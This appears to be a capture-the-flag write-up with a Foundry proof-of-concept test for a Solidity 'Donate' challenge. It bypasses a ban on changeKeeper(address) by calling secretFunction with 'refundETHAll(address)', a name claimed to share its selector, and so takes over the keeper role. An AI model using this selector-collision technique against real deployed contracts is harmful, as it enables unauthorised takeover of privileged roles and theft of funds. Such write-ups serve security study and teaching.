# Analysis:
The key is to use the `secretFunction()` to call the `changeKeeper()`, the parameter should be `changeKeeper(address)`, or any function with same signature.

The signature of `changeKeeper(address)` is `0x097798381ee91bee7e3420f37298fe723a9eedeade5440d4b2b5ca3192da2428` which is banned, but we can use another function name `refundETHAll(address)`.

# POC (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/donate.sol";

contract donateHack is Test {
	Donate donate;
	address keeper = makeAddr("keeper");
	address owner = makeAddr("owner");
	address hacker = makeAddr("hacker");

	function setUp() public {
		vm.prank(owner);
		donate = new Donate(keeper);
		console.log("keeper2 - ", donate.keeper());
	}

	function testhack() public {
		vm.startPrank(hacker);
		// Hack Time

		donate.secretFunction(string("refundETHAll(address)"));

		require(donate.keeperCheck(), "not pass !!!!!!");
	}
}


```

